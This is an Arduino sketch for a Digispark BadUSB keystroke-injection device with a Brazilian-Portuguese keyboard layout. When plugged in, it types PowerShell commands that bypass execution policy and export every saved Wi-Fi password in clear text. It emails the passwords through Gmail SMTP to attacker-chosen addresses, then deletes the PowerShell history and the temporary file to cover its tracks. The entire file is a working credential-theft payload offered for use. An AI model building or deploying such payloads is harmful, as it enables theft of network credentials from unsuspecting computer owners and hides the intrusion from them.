#include "DigiKeyboardPtBr.h"

char mode[] = "powershell -nop -exec bypass";
char separator[] = "read-host";

void setup() {
  // put your setup code here, to run once:
DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(mode);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("cd $env:temp");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("netsh wlan export profile key=clear");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > senhawifi.csv");
  DigiKeyboardPtBr.delay(1000);
  
  //E-mail que ira enviar:
  DigiKeyboardPtBr.println(F("$email = \"SEU_EMAIL\";"));
  //E-mails que irão receber:
  DigiKeyboardPtBr.println(F("$addressee = \"SEU_EMAIL1 , SEU_EMAIL2\";"));
  // o lugar onde vai salvar as senhas
  DigiKeyboardPtBr.println(F("$tempcsv = \"$env:temp\\senhawifi.csv\";"));
  // senha do seu e-mail que ira enviar:
  DigiKeyboardPtBr.println(F("$pass = \"SUA_SENHA\";"));
  DigiKeyboardPtBr.println(F("$smtpServer = \"smtp.gmail.com\";"));
  DigiKeyboardPtBr.println(F("$port = \"587\";"));
  

  
  DigiKeyboardPtBr.println(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboardPtBr.println(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboardPtBr.println(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboardPtBr.println(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboardPtBr.println(F("$smtp.EnableSsl = $true;"));
  DigiKeyboardPtBr.println(F("$msg.From = \"$email\";"));
  DigiKeyboardPtBr.println(F("$msg.To.Add(\"$addressee\");"));
  DigiKeyboardPtBr.println(F("$msg.Attachments.Add(\"$tempcsv\");"));
  DigiKeyboardPtBr.println(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboardPtBr.println(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboardPtBr.println(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboardPtBr.println(F("$msg.Subject = \"Senhas WIFI\";"));
  DigiKeyboardPtBr.println(F("$msg.Body = \"<h2> Aqui as suas senhas K0D4, DIVIRTA-SE. </h2></br>olha o arquivo...\"; "));
  DigiKeyboardPtBr.println(F("$SMTP.Credentials = $cred;"));
  DigiKeyboardPtBr.println(F("$smtp.Send($msg);"));
  DigiKeyboardPtBr.println("exit");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(separator);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(mode);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("del (Get-PSReadlineOption).HistorySavePath;"));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("rm \"$env:temp\\senhawifi.csv\""));
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.println(separator);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("exit");
}


void loop() {
  // put your main code here, to run repeatedly:

}
